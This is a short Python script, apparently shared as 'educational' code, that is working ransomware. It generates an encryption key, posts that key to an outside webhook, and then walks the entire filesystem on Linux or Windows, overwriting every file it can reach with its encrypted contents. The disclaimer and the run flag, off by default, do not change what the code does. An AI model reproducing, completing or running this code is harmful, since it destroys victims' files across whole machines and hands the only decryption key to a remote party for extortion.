# -*- coding: utf-8 -*-

# Author Karbasi
# The code provided in this repository is for educational and informational purposes only.
# I do not take any responsibility for any misuse or damage that may result from the use of this code.
# Use it at your own risk.

import os
from cryptography.fernet import Fernet
from requests import post
from string import ascii_uppercase

Run_it_at_your_own_RISK = 0 # If you want to run this script change the 0 to 1
webhook = "Your_webhook_API"  # change this to your webhook API

def key_sender(data, attempts: int = 5):
    # attempts for sending the key just in case
    for attempt in range(attempts):
        try:
            post(webhook, data)
            print("[+] Successful sent the key to webhook")
            break
        except Exception as e:
            print("[-] Failed to send the key, ERROR: ", e)

def filewriter(file: str, data: bytes):
    with open(file, 'wb') as f:
        f.write(data)
        print(f"[+] Encrypted {file}")

def filereader(file: str):
    with open(file, "rb") as f:
        data = f.read()
    print(f"[+] Reading {file}")
    filewriter(file, tool.encrypt(data))

def walker(files: list, path: str):
    file = None
    try:
        for file in files:
            filepath = os.path.join(path, file)
            if filepath == __file__:
                continue
            else:
                filereader(filepath)
    except PermissionError:
        print(f"[-] Permission Error: Unable to read/encrypt {file}")
    except FileNotFoundError:
        print(f"[-] File Not Found: {file}")
    except Exception as e:
        print(f"[-] Failed to encrypt {file}: {e}")

def linux():
    os.chdir("/")
    for path, directories, files in os.walk("/"):
        walker(files, path)

def windows():
    drives = []
    for letter in ascii_uppercase:
        if os.path.exists(f"{letter}:"):
            drives.append(letter)
    for drive in drives:
        os.chdir(f"{drive}:\\")
        for path, directories, files in os.walk(f"{drive}:\\"):
            walker(files, path)


if Run_it_at_your_own_RISK != 0:
    key = Fernet.generate_key()
    key_sender(key)
    tool = Fernet(key)
    # support for cross-platform and a new thing I learned to do :)
    {
        "posix": linux,
        "nt": windows
    }.get(os.name, lambda: print("[!] System is not supported."))()
